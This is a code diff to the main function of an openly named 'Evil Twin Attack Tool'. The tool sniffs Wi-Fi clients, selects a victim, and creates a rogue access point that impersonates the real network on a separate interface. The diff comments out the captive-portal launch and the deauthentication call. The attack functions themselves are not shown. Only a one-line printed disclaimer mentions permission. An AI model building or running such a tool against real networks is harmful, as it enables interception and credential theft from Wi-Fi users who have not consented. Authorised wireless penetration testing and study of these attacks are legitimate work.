@@ -21,7 +21,26 @@ def display_clients(bssid):
 
 
 def main():
+    print("Welcome to the Evil Twin Attack Tool!")
+    print("This tool allows you to perform an Evil Twin attack on Wi-Fi networks.")
+    print("Make sure you have the necessary permissions and are in a legal environment.")
+    print("-" * 50)
+    print("Please select the interfaces for sniffing and AP mode.")
+    print("You will need two interfaces: one for sniffing and one for creating the Evil AP.")
+    print("Choose interface for sniffing first, then for AP mode.")
+    print("-" * 50)
     iface = scan.select_interface()
+    ap_iface = scan.select_interface()
+    if not iface or not ap_iface:
+        print("No valid interface selected. Exiting.")
+        sys.exit(1)
+    if iface == ap_iface:
+        print("Cannot use the same interface for both sniffing and AP mode. Exiting.")
+        sys.exit(1)
+    print(f"Using interface for sniffing: {iface}")
+    print(f"Using interface for AP mode: {ap_iface}")
+    print("-" * 50)
+
     print(f"Starting sniffing on {iface}...")
     sniffer = scan.start_sniff(iface)
 
@@ -71,13 +90,13 @@ def main():
                 print(f"Selected Client: {client_mac}, Packets: {clients[client_mac]['pkt_count']}, Last Seen: {clients[client_mac]['last_seen']}")
 
                 # Start the attack
-                attack.create_evil_ap(ap_info, iface)
+                attack.create_evil_ap(ap_info, ap_iface)
 
                 # Launch captive portal in background
-                portal_thread = Thread(target=attack.start_captive_portal, daemon=True)
-                portal_thread.start()
+                # portal_thread = Thread(target=attack.start_captive_portal, daemon=True)
+                # portal_thread.start()
 
-                attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
+                # attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
 
                 # Stop packet sniffing (we don't need it now)
                 scan.stop_sniff.set()
